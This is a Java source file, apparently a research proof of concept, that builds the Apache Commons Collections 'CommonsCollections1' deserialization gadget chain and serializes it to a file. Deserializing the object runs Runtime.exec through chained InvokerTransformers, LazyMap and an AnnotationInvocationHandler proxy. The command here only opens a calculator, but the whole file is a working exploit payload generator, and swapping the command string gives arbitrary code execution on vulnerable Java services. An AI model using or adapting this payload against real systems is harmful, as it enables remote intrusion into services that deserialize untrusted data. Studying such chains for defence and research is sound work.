package com.trganda.gadget.cc3;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1 {

    public static Object getObject()
            throws ClassNotFoundException,
                    InvocationTargetException,
                    InstantiationException,
                    IllegalAccessException,
                    NoSuchMethodException {
        ChainedTransformer chainedTransformer =
                new ChainedTransformer(
                        new Transformer[] {
                            new ConstantTransformer(Runtime.class),
                            new InvokerTransformer(
                                    "getMethod",
                                    new Class[] {String.class, Class[].class},
                                    new Object[] {"getRuntime", new Class[0]}),
                            new InvokerTransformer(
                                    "invoke",
                                    new Class[] {Object.class, Object[].class},
                                    new Object[] {null, new Object[0]}),
                            new InvokerTransformer(
                                    "exec",
                                    new Class[] {String.class},
                                    new Object[] {"open -a calculator"})
                        });

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);

        Constructor annotationInvocationHandler =
                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler")
                        .getDeclaredConstructor(Class.class, Map.class);

        annotationInvocationHandler.setAccessible(true);
        InvocationHandler annoHandler =
                (InvocationHandler)
                        annotationInvocationHandler.newInstance(Override.class, lazyMap);
        // 代理了 Map 接口
        Map map =
                (Map)
                        Proxy.newProxyInstance(
                                ClassLoader.getSystemClassLoader(),
                                new Class[] {Map.class},
                                annoHandler);

        InvocationHandler anotherHandler =
                (InvocationHandler) annotationInvocationHandler.newInstance(Override.class, map);

        return anotherHandler;
    }
    public static void main(String[] args)
            throws IOException,
                    ClassNotFoundException,
                    InvocationTargetException,
                    InstantiationException,
                    IllegalAccessException,
                    NoSuchMethodException {
        ObjectOutputStream oos =
                new ObjectOutputStream(
                        Files.newOutputStream(Paths.get("target/CommonsCollection1.bin")));
        oos.writeObject(getObject());

        //ObjectInputStream ois =
        //        new ObjectInputStream(
        //                Files.newInputStream(Paths.get("target/CommonsCollection1.bin")));
        //ois.readObject();
    }
}
